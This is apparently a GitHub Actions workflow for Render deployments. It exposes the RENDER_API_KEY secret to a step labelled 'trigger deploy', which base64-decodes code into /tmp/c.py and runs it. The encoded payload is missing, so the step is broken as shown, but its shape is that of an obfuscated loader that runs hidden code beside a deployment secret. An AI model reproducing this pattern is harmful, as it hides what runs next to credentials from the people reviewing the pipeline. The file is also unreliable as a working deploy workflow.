name: render-ops
on:
  workflow_dispatch:
    inputs:
      service_id:
        description: Render service id (srv-...)
        required: true
jobs:
  ops:
    runs-on: ubuntu-latest
    env:
      RENDER_API_KEY: ${{ secrets.RENDER_API_KEY }}
      SERVICE_ID: ${{ inputs.service_id }}
    steps:
      - name: trigger deploy
        run: |
          echo  | base64 -d > /tmp/c.py
          python3 /tmp/c.py
